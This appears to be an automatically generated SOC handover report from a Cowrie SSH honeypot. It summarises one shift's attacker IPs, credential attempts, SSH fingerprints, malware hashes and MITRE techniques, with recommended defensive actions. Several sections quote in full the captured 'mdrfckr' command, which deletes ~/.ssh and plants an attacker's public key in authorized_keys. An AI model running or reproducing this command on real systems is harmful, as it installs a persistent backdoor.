# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-03 |
| **Generated At** | 2026-06-03T21:20:13Z |
| **Shift Time** | 21:20 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **60** |
| Confirmed Threats | **30** |
| False Positives Filtered | **30** (50.0%) |
| Unique Attacker IPs | **22** |
| Countries of Origin | **10** |
| High Severity Cases | **5** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **55** |
| Malware Samples Analyzed | **0** HIGH · **19** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **11** |
| Unique Credential Pairs | **8** |
| Unique Usernames | **5** |
| Unique Passwords | **8** |
| Successful Auth Pairs | **5** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 5 |
| `345gs5662d34` | 3 |
| `mcserver` | 1 |
| `mirco` | 1 |
| `user` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 3 |
| `3245gs5662d34` | 2 |
| `P@ssw0rd@321` | 1 |
| `cyber` | 1 |
| `Welcome2021` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 3 |
| `root` | `3245gs5662d34` | 2 |
| `root` | `P@ssw0rd@321` | 1 |
| `root` | `cyber` | 1 |
| `root` | `Welcome2021` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `P@ssw0rd@321` | `128.14.237.154` | 2026-06-03T19:23:43 |
| `root` | `cyber` | `14.103.118.74` | 2026-06-03T19:25:53 |
| `root` | `3245gs5662d34` | `14.103.118.74` | 2026-06-03T19:25:57 |
| `root` | `Welcome2021` | `143.198.221.127` | 2026-06-03T20:42:44 |
| `root` | `3245gs5662d34` | `143.198.221.127` | 2026-06-03T20:42:46 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **60** |
| Sessions with Fingerprint | **7** |
| Unique HASSH Fingerprints | **7** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 16 |
| Go SSH scanner | 2 |
| OpenSSH | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 7 | 4 |
| `03a80b21afa8...` | Modern SSH client | 4 | 2 |
| `bc9e7273cde2...` | Mirai/variant | 1 | 1 |
| `873a5fb5fedc...` | Mirai/variant | 1 | 1 |
| `084386fa7ae5...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 7 | 4 | Mirai/variant |
| `95420f9d932d...` | libssh | 4 | 3 | — |
| `03a80b21afa8...` | libssh | 4 | 2 | Modern SSH client |
| `bc9e7273cde2...` | OpenSSH | 1 | 1 | Mirai/variant |
| `873a5fb5fedc...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `af8223ac9914...` | libssh | 1 | 1 | libssh-based |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 3 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `14.103.118.74`, `128.14.237.154`, `143.198.221.127`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **22** |
| Unique ASNs | **16** |
| High-Risk ASNs | **13** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS9808` | China Mobile Communications Group Co., Ltd. | 2 | HIGH |
| `AS25369` | Hydra Communications Ltd | 2 | HIGH |
| `AS396982` | Google LLC | 2 | LOW |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS3462` | Data Communication Business Group | 2 | HIGH |
| `AS398324` | Censys, Inc. | 2 | HIGH |
| `AS44034` | Hi3G Access AB | 1 | LOW |
| `AS45102` | Alibaba (US) Technology Co., Ltd. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (5)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-972dfa64cb52

| Field | Detail |
|---|---|
| **Source IP** | `128.14.237[.]154` |
| **First Seen** | 2026-06-03 19:23 |
| **Last Seen** | 2026-06-03 19:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 19:23:42` | `cowrie.session.connect` |
| `2026-06-03 19:23:42` | `cowrie.client.version` |
| `2026-06-03 19:23:42` | `cowrie.client.kex` |
| `2026-06-03 19:23:43` | `cowrie.login.success` |
| `2026-06-03 19:23:43` | `cowrie.session.params` |
| `2026-06-03 19:23:43` | `cowrie.command.input` |
| `2026-06-03 19:23:43` | `cowrie.command.failed` |
| `2026-06-03 19:23:43` | `cowrie.log.closed` |
| `2026-06-03 19:23:43` | `cowrie.session.params` |
| `2026-06-03 19:23:43` | `cowrie.command.input` |
| `2026-06-03 19:23:44` | `cowrie.session.file_download` |
| `2026-06-03 19:23:44` | `cowrie.log.closed` |
| `2026-06-03 19:23:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.14.237[.]154` to AbuseIPDB if not already reported
- [ ] Block `128.14.237[.]154` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac3ec738936a

| Field | Detail |
|---|---|
| **Source IP** | `14.103.118[.]74` |
| **First Seen** | 2026-06-03 19:25 |
| **Last Seen** | 2026-06-03 19:25 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 19:25:53` | `cowrie.session.connect` |
| `2026-06-03 19:25:53` | `cowrie.client.version` |
| `2026-06-03 19:25:53` | `cowrie.client.kex` |
| `2026-06-03 19:25:53` | `cowrie.login.success` |
| `2026-06-03 19:25:53` | `cowrie.session.params` |
| `2026-06-03 19:25:53` | `cowrie.command.input` |
| `2026-06-03 19:25:53` | `cowrie.command.failed` |
| `2026-06-03 19:25:54` | `cowrie.log.closed` |
| `2026-06-03 19:25:54` | `cowrie.session.params` |
| `2026-06-03 19:25:54` | `cowrie.command.input` |
| `2026-06-03 19:25:54` | `cowrie.session.file_download` |
| `2026-06-03 19:25:54` | `cowrie.log.closed` |
| `2026-06-03 19:25:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.118[.]74` to AbuseIPDB if not already reported
- [ ] Block `14.103.118[.]74` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac4c1d5a7dd9

| Field | Detail |
|---|---|
| **Source IP** | `14.103.118[.]74` |
| **First Seen** | 2026-06-03 19:25 |
| **Last Seen** | 2026-06-03 19:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 19:25:56` | `cowrie.session.connect` |
| `2026-06-03 19:25:56` | `cowrie.client.version` |
| `2026-06-03 19:25:56` | `cowrie.client.kex` |
| `2026-06-03 19:25:57` | `cowrie.login.success` |
| `2026-06-03 19:25:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.118[.]74` to AbuseIPDB if not already reported
- [ ] Block `14.103.118[.]74` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-007a26f1e9f1

| Field | Detail |
|---|---|
| **Source IP** | `143.198.221[.]127` |
| **First Seen** | 2026-06-03 20:42 |
| **Last Seen** | 2026-06-03 20:42 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 20:42:44` | `cowrie.session.connect` |
| `2026-06-03 20:42:44` | `cowrie.client.version` |
| `2026-06-03 20:42:44` | `cowrie.client.kex` |
| `2026-06-03 20:42:44` | `cowrie.login.success` |
| `2026-06-03 20:42:44` | `cowrie.session.params` |
| `2026-06-03 20:42:44` | `cowrie.command.input` |
| `2026-06-03 20:42:44` | `cowrie.command.failed` |
| `2026-06-03 20:42:44` | `cowrie.log.closed` |
| `2026-06-03 20:42:44` | `cowrie.session.params` |
| `2026-06-03 20:42:44` | `cowrie.command.input` |
| `2026-06-03 20:42:44` | `cowrie.session.file_download` |
| `2026-06-03 20:42:44` | `cowrie.log.closed` |
| `2026-06-03 20:42:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.198.221[.]127` to AbuseIPDB if not already reported
- [ ] Block `143.198.221[.]127` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5840274594aa

| Field | Detail |
|---|---|
| **Source IP** | `143.198.221[.]127` |
| **First Seen** | 2026-06-03 20:42 |
| **Last Seen** | 2026-06-03 20:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 20:42:46` | `cowrie.session.connect` |
| `2026-06-03 20:42:46` | `cowrie.client.version` |
| `2026-06-03 20:42:46` | `cowrie.client.kex` |
| `2026-06-03 20:42:46` | `cowrie.login.success` |
| `2026-06-03 20:42:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.198.221[.]127` to AbuseIPDB if not already reported
- [ ] Block `143.198.221[.]127` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `45.66.156[.]214` | **4** | 2026-06-03 17:16 | 2026-06-03 17:52 | 2m | 0 | `T1592` | 🟢 LOW |
| `45.66.156[.]214` | **3** | 2026-06-03 20:36 | 2026-06-03 20:58 | 2m | 0 | `T1592` | 🟢 LOW |
| `20.169.105[.]57` | **2** | 2026-06-03 18:55 | 2026-06-03 18:55 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]205` | **2** | 2026-06-03 17:36 | 2026-06-03 17:36 | 0m | 0 | `T1592` | 🟢 LOW |
| `111.21.105[.]250` | 1 | 2026-06-03 20:24 | 2026-06-03 20:26 | 120s | 0 | `T1592` | 🟢 LOW |
| `114.34.17[.]11` | 1 | 2026-06-03 20:24 | 2026-06-03 20:24 | 30s | 0 | `T1592` | 🟢 LOW |
| `114.35.208[.]214` | 1 | 2026-06-03 19:16 | 2026-06-03 19:17 | 30s | 0 | `T1592` | 🟢 LOW |
| `120.231.191[.]12` | 1 | 2026-06-03 19:31 | 2026-06-03 19:33 | 120s | 0 | `T1592` | 🟢 LOW |
| `128.14.237[.]154` | 1 | 2026-06-03 19:23 | 2026-06-03 19:23 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `138.199.237[.]72` | 1 | 2026-06-03 20:51 | 2026-06-03 20:51 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.118[.]74` | 1 | 2026-06-03 19:25 | 2026-06-03 19:25 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `143.198.221[.]127` | 1 | 2026-06-03 20:42 | 2026-06-03 20:42 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `188.240.59[.]58` | 1 | 2026-06-03 18:27 | 2026-06-03 18:27 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.78.207[.]244` | 1 | 2026-06-03 20:47 | 2026-06-03 20:48 | 20s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `58.152.42[.]174` | 1 | 2026-06-03 21:14 | 2026-06-03 21:14 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `66.132.172[.]96` | 1 | 2026-06-03 18:31 | 2026-06-03 18:32 | 15s | 0 | `T1592` | 🟢 LOW |
| `69.5.169[.]150` | 1 | 2026-06-03 18:27 | 2026-06-03 18:27 | 0s | 0 | `T1592` | 🟢 LOW |
| `8.219.209[.]112` | 1 | 2026-06-03 17:26 | 2026-06-03 17:27 | 30s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (32 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 39/100 | 🟢 LOW | **23/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 41/100 | 🟡 MEDIUM | **29/75** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 41/100 | 🟡 MEDIUM | **29/75** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `120.231.191[.]12` | CN | China Mobile Communications Corporation | **100** ⚠️ | 3 |
| `45.66.156[.]214` | US | Enzu cloud and colocation services | **100** ⚠️ | 1 |
| `66.132.172[.]96` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `188.240.59[.]58` | GB | Infrawatch Limited | **100** ⚠️ | 7 |
| `128.14.237[.]154` | TW | UCLOUD | **100** ⚠️ | 50 |
| `69.5.169[.]150` | DE | Infrawatch Limited | **100** ⚠️ | 11 |
| `138.199.237[.]72` | DE | Hetzner Online GmbH | **100** ⚠️ | 0 |
| `14.103.118[.]74` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `111.21.105[.]250` | CN | China Mobile Communications Corporation | **100** ⚠️ | 31 |
| `114.35.208[.]214` | TW | Chunghwa Telecom Data Communication Business Group | **100** ⚠️ | 8 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 19 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 6 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 5 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 3 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 3 |

---

## 🔕 False Positive Summary (30 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 4 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 25 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 60 cases |
| Tool 34  | Credential Extractor        | ✅ 11 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 7 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 22 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 30 filtered (50.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 16 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 32 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 5 priority case(s) shown individually · 18 recon entry/entries in table (4 group(s) consolidating 11 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-03T21:20:13Z_
